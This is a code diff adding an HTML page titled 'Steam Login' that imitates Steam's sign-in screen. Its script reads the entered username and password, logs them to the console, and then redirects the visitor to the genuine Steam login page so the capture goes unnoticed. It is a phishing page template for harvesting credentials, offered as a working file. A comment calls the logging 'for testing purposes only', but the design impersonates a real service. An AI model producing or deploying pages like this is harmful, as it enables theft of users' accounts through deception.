@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Steam Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #171a21;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background-color: #1b2838;
+      padding: 20px;
+      border-radius: 5px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+      width: 300px;
+      text-align: center;
+    }
+    .login-container h1 {
+      margin-bottom: 20px;
+      font-size: 24px;
+    }
+    .login-container input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #2a475e;
+      border-radius: 3px;
+      background-color: #2a475e;
+      color: #fff;
+    }
+    .login-container input::placeholder {
+      color: #ccc;
+    }
+    .login-container button {
+      width: 100%;
+      padding: 10px;
+      background-color: #5c7e10;
+      border: none;
+      border-radius: 3px;
+      color: #fff;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .login-container button:hover {
+      background-color: #6b8e23;
+    }
+    .login-container a {
+      color: #66c0f4;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .login-container a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h1>Sign In</h1>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Username" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit">Sign In</button>
+    </form>
+    <p><a href="#">Forgot your password?</a></p>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // Log the credentials to the console (for testing purposes only)
+      console.log(`Username: ${username}`);
+      console.log(`Password: ${password}`);
+
+      // Redirect to the real Steam login page after submission
+      window.location.href = 'https://store.steampowered.com/login/?redir=&redir_ssl=1&snr=1_4_4__global-header';
+    });
+  </script>
+</body>
+</html>
